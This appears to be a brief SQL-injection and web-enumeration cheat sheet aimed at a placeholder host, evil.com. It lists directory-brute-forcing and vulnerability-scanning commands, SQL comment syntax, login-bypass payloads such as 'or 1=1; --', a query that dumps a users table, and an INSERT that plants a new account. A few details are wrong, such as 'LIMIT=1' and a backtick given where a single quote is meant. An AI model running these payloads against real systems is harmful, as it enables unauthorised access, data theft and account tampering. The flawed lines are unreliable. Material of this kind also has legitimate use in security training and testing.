## Enumerate
```bash
dirb evil.com -r -z10 # recursive; wait 10 milliseconds between delays

python3 dirsearch/dirsearch.py -u evil.com --simple-report demo-webcrawl.txt

nikto -h evil.com -Format txt -o demo-vulnscan-web.txt
```

SQL Injection Vulnerabilities
```bash
` # single-quote
# the resulting error may indicate the underlying web server software, database software, and server OS. 
```

## Exploit
Comments
```sql
# MySQL, MariaDB
-- Oracle
/* Oracle
*/ Oracle
```

SQL Injection Examples
```bash
# return all rows from the table
victor' or 1=1; -- # put in the username field

# return the first row in the table
victor' or 1=1 LIMIT=1; -- # put in the username field
```

## Explore
```sql
SELECT * FROM target.users # database.table
```

## Effect
Add a new user to a SQL database
```sql
INSERT INTO target.users(username, password) VALUES ('victor','please');
```
